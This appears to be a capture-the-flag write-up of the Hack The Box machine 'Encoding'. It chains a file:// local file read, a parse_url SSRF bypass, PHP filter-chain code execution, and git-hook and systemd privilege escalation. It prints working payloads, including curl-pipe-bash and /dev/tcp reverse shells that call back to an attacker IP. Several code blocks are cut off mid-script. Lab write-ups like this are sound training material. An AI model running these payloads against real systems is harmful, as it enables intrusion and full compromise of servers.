<p>Start by mapping open ports, services, and the application stack.</p>

<h3 id="adding-hosts-to-etc-hosts">Adding Hosts to /etc/hosts</h3>

<h2 id="2-understanding-the-web-application">2. Understanding the Web Application</h2>

<p>When you land on a web app, don't just click around randomly. Understand the tech stack, identify entry points, and look for places where user input reaches the server. Every form, every API endpoint, and every URL parameter is a potential attack vector.</p>
<h3 id="what-we-found">What We Found</h3>
<ul>
<li><strong>Main Site (<code>haxtables.htb</code>):</strong> A "string and number converter" toy app. Has pages for String, Integer, Image, and API documentation.</li>
<li><strong>API Site (<code>api.haxtables.htb</code>):</strong> Documented endpoints for <code>POST /v3/tools/string/index.php</code> and <code>POST /v3/tools/integer/index.php</code>.</li>
<li><strong>Image Site (<code>image.haxtables.htb</code>):</strong> Returns 403 Forbidden. This is suspicious - it might be filtering by IP.</li>
</ul>
<p><strong>Key Observation:</strong> The API documentation shows Python examples. The last example is interesting:</p>
<pre><code class="language-python" data-language="python">json_data = {
    'action': 'str2hex',
    'file_url' : 'http://example.com/data.txt'
}
response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
</code></pre>
<p><strong>The <code>file_url</code> parameter stands out.</strong> Instead of sending data directly, we can ask the server to fetch data from a URL. This suggests "Server-Side Request Forgery (SSRF)" or "Local File Inclusion (LFI)."</p>
<hr>
<h2 id="3-discovering-the-lfi">3. Discovering the LFI</h2>

<p>When you see a parameter that takes a URL, immediately test:</p>
<ol>
<li><strong>SSRF:</strong> Can it reach internal services? (<code>http://127.0.0.1</code>, <code>http://localhost</code>)</li>
<li><strong>LFI:</strong> Can it read local files? (<code>file:///etc/passwd</code>)</li>
<li><strong>RFI:</strong> Can it load remote files? (<code>http://attacker.com/evil.php</code>)</li>
</ol>
<p>The <code>file://</code> scheme is often forgotten by developers. They might block <code>http://127.0.0.1</code> but completely miss <code>file:///etc/passwd</code>.</p>
<h3 id="testing-the-lfi">Testing the LFI</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://api.haxtables.htb/v3/tools/string/index.php \
  -H "Content-Type: application/json" \
  -d '{"action":"str2hex","file_url":"file:///etc/passwd"}' | \
  python3 -c "import sys,json; print(bytes.fromhex(json.load(sys.stdin)['data']).decode())"
</code></pre>
<p><strong>Result:</strong> The server returns the hex-encoded contents of <code>/etc/passwd</code>.</p>
<p><strong>Mechanism:</strong> The server uses <code>curl</code> or <code>file_get_contents()</code> to fetch the URL. The <code>file://</code> scheme tells it to read from the local filesystem instead of making an HTTP request. The developer only blocked HTTP SSRF, not file-based LFI.</p>
<p><strong>What we learned:</strong></p>
<ul>
<li>We can read any file the web server user (<code>www-data</code>) can read.</li>
<li>The user <code>svc</code> exists on the system (<code>uid=1000</code>).</li>
<li>The hostname is <code>encoding</code>.</li>
</ul>
<hr>
<h2 id="4-the-ssrf-bypass">4. The SSRF Bypass</h2>

<p>We know <code>image.haxtables.htb</code> returns 403 from our IP. The Apache config (which we can read via LFI) reveals:</p>
<pre><code class="language-apache" data-language="apache">&lt;Directory /var/www/image&gt; 
    Deny from all
    Allow from 127.0.0.1
&lt;/Directory&gt;
</code></pre>
<p>It's localhost-only. We need to reach it from the server itself. The <code>file_url</code> parameter has a check:</p>
<pre><code class="language-php" data-language="php">$domain = parse_url($url, PHP_URL_HOST);
if (gethostbyname($domain) === "127.0.0.1") {
    echo jsonify(["message" =&gt; "Unacceptable URL"]);
}
</code></pre>
<p><strong>The Vulnerability:</strong> PHP's <code>parse_url()</code> is weird. If you pass <code>http://image.haxtables.htb</code>, it returns <code>image.haxtables.htb</code>. But if you pass <code>image.haxtables.htb</code> <strong>without the scheme</strong>, <code>parse_url()</code> returns <code>NULL</code> for the host. <code>gethostbyname(NULL)</code> does NOT return <code>127.0.0.1</code>, so the check passes. Meanwhile, <code>curl</code> doesn't care if there's no scheme - it defaults to HTTP.</p>
<h3 id="testing-the-bypass">Testing the Bypass</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://api.haxtables.htb/v3/tools/string/index.php \
  -H "Content-Type: application/json" \
  -d '{"action":"str2hex","file_url":"image.haxtables.htb/actions/action_handler.php?page=/etc/passwd"}' | \
  python3 -c "import sys,json; print(bytes.fromhex(json.load(sys.stdin)['data']).decode())"
</code></pre>
<p><strong>Result:</strong> We read <code>/etc/passwd</code> through <code>image.haxtables.htb</code>. The bypass works.</p>
<p><strong>What we discovered:</strong> <code>image.haxtables.htb/actions/action_handler.php</code> contains:</p>
<pre><code class="language-php" data-language="php">&lt;?php
include_once 'utils.php';
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);  // &lt;-- LFI!
}
?&gt;
</code></pre>
<p>This is a direct file inclusion. If we can make PHP execute code through this <code>include()</code>, we get RCE.</p>
<hr>
<h2 id="5-from-lfi-to-rce">5. From LFI to RCE</h2>

<p>Classic LFI (Local File Inclusion) used to require log poisoning or file uploads to get RCE. But modern PHP has a powerful technique: <strong>PHP Filter Chain Injection</strong>.</p>
<p>The idea: PHP's <code>php://filter/</code> wrapper allows chaining conversion filters. By carefully stacking encoding/decoding filters on a temporary empty file, we can craft arbitrary PHP code byte-by-byte. The server includes our filter chain, which generates and executes our payload.</p>
<h3 id="tool-php-filter-chain-generator">Tool: php_filter_chain_generator</h3>
<pre><code class="language-bash" data-language="bash">git clone https://github.com/synacktiv/php_filter_chain_generator.git
</code></pre>
<p>This tool generates the exact filter chain needed to inject arbitrary PHP code.</p>
<h3 id="proving-code-execution">Proving Code Execution</h3>
<p>First, test with a simple command to confirm execution:</p>
<pre><code class="language-bash" data-language="bash">python3 -c "
import subprocess, requests

chain = subprocess.check_output([
    'python3', 'php_filter_chain_generator.py',
    '--chain', '&lt;?php system(\"id\"); ?&gt;'
], text=True).splitlines()[-1].strip()

resp = requests.post(
    'http://api.haxtables.htb/v3/tools/string/index.php',
    json={'action': 'str2hex', 'file_url': f'image.haxtables.htb/actions/action_handler.php?page={chain}'}
)

print(bytes.fromhex(resp.json()['data']).decode())
"
</code></pre>
<p><strong>Result:</strong> <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
<p><strong>We have RCE as www-data.</strong></p>
<hr>
<h2 id="6-shell-as-www-data">6. Shell as www-data</h2>

<p>Getting RCE is great, but an interactive shell is better. We need a stable reverse shell. The challenge: the filter chain is very long (thousands of characters). If the request hangs or times out, the server might kill the PHP process before the shell spawns.</p>
<p><strong>Better approach:</strong> Instead of embedding a long reverse shell command in the filter chain, keep the command short. The shortest reliable approach is to have the server download a shell script from us and pipe it to bash.</p>
<h3 id="setting-up-the-shell">Setting Up the Shell</h3>
<p><strong>Terminal 1 (Kali) - create script and start HTTP server:</strong></p>
<pre><code class="language-bash" data-language="bash">echo 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1' &gt; /tmp/shell.sh
python3 -m http.server 8000
</code></pre>
<p><strong>Terminal 2 (Kali) - start listener:</strong></p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p><strong>Terminal 3 (Kali) - send the payload:</strong></p>
<pre><code class="language-bash" data-language="bash">python3 -c "
import subprocess, requests

chain = subprocess.check_output([
    'python3', 'php_filter_chain_generator.py',
    '--chain', '&lt;?php system(\"curl -s http://10.10.16.84:8000/shell.sh | bash\"); ?&gt;'
], text=True).splitlines()[-1].strip()

requests.post(
    'http://api.haxtables.htb/v3/tools/string/index.php',
    json={'action': 'str2hex', 'file_url': f'image.haxtables.htb/actions/action_handler.php?page={chain}'}
)
print('Payload sent.')
"
</code></pre>
<p><strong>Mechanism:</strong></p>
<ul>
<li>The filter chain is short because the PHP payload is short.</li>
<li><code>system()</code> returns immediately because <code>curl | bash</code> forks the shell in the background.</li>
<li>The backgrounded bash shell connects back to our listener independently.</li>
</ul>
<p><strong>Result:</strong></p>
<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.11.197] 45534

<h2 id="7-privilege-escalation-to-svc">7. Privilege Escalation to svc</h2>

<p>Run <code>sudo -l</code> on any shell you get. It tells you exactly what the current user can do with elevated privileges.</p>
<p>From the www-data shell:</p>
<pre><code class="language-bash" data-language="bash">sudo -l

<pre><code>User www-data may run the following commands on encoding:

<p>We can run a git commit script as <code>svc</code> without a password. Time to understand what this script does.</p>
<h3 id="analyzing-git-commit-sh">Analyzing git-commit.sh</h3>
<pre><code class="language-bash" data-language="bash">#!/bin/bash

if [[ $u ]]; then

</code></pre>
<p><strong>Logic:</strong></p>
<ul>
<li>If there are untracked files in <code>/var/www/image</code>, add them.</li>
<li>If there are NO untracked files, commit the staged changes.</li>
</ul>
<p><strong>The Hook:</strong> Git has a hook called <code>post-commit</code> that runs <strong>after</strong> a successful commit. If we write a malicious <code>post-commit</code> script and trigger a commit as <code>svc</code>, our code executes as <code>svc</code>.</p>
<h3 id="checking-permissions">Checking Permissions</h3>
<pre><code class="language-bash" data-language="bash">getfacl /var/www/image/.git/
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>user:www-data:rwx
</code></pre>
<p><code>www-data</code> can write to the <code>.git</code> directory, including <code>.git/hooks/</code>.</p>
<h3 id="the-exploit">The Exploit</h3>
<p><strong>Step 1 - write the post-commit hook:</strong></p>
<pre><code class="language-bash" data-language="bash">cd /var/www/image

</code></pre>
<p><strong>Step 2 - stage a file to force a commit:</strong></p>
<pre><code class="language-bash" data-language="bash">/usr/bin/git --git-dir=/var/www/image/.git --work-tree=/etc add /etc/hosts
</code></pre>
<p>We use <code>--work-tree=/etc</code> to stage a file outside the repo. This doesn't create untracked files in <code>/var/www/image</code>, so <code>git-commit.sh</code> will take the <code>else</code> branch and commit.</p>
<p><strong>Step 3 - trigger the commit as svc:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo -u svc /var/www/image/scripts/git-commit.sh
</code></pre>

<p><strong>Mechanism:</strong> Git hooks run with the privileges of the user executing git. Since <code>sudo -u svc</code> runs git as <code>svc</code>, the hook also runs as <code>svc</code>.</p>

<h2 id="8-privilege-escalation-to-root">8. Privilege Escalation to root</h2>

<p>Again, <code>sudo -l</code> is the first thing to run.</p>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>User svc may run the following commands on encoding:

<p><code>svc</code> can restart <strong>any</strong> systemd service as root. Systemd services run as whatever user is specified in their unit file. If we create a service that runs as <code>root</code> and executes a command of our choosing, we get root.</p>

<pre><code class="language-bash" data-language="bash">find /etc/systemd -writable

<p><strong>Step 1 - create the malicious service:</strong></p>
<pre><code class="language-bash" data-language="bash">echo '[Unit]

ExecStart=/bin/bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.84/7777 0&gt;&amp;1"

<p><strong>Step 3 - restart the service as root:</strong></p>
<pre><code class="language-bash" data-language="bash">sudo systemctl restart privesc
</code></pre>
<p><strong>Mechanism:</strong></p>
<ul>
<li><code>svc</code> can write to <code>/etc/systemd/system/</code>.</li>
<li><code>svc</code> can run <code>systemctl restart *</code> as root without a password.</li>
<li>On this systemd version, <code>restart</code> on a newly created unit file works without <code>daemon-reload</code>.</li>

<h2 id="9-key-lessons">9. Key Lessons</h2>
<h3 id="1-parse-url-quirks">1. Parse URL Quirks</h3>
<p>PHP's <code>parse_url()</code> without a scheme returns <code>NULL</code> for the host. Developers who rely on it for SSRF protection create trivial bypasses.</p>
<h3 id="2-file-schemes-are-forgotten">2. File Schemes Are Forgotten</h3>
<p>If an application fetches URLs, always test <code>file:///etc/passwd</code>. Developers often secure HTTP/HTTPS but completely miss <code>file://</code>.</p>
<h3 id="3-php-filter-chains">3. PHP Filter Chains</h3>
<p>Modern PHP LFI can become RCE through <code>php://filter/</code> chain injection. Learn this technique - it works on many CTFs and real applications.</p>
<h3 id="4-abusing-git-hooks">4. Abusing Git Hooks</h3>
<p>If a user can run <code>git</code> as another user (via sudo, cron, etc.), and can write to <code>.git/hooks/</code>, that's essentially code execution as the target user.</p>
<h3 id="5-systemctl-restart">5. systemctl restart *</h3>
<p><code>systemctl restart *</code> as root is incredibly powerful. Any user who can create unit files and restart services can get root.</p>
<h3 id="6-short-payloads-beat-long-ones">6. Short Payloads Beat Long Ones</h3>
<p>When exploiting through injection or encoding, shorter payloads are more reliable. Offload complexity to a downloaded script rather than embedding it directly.</p>
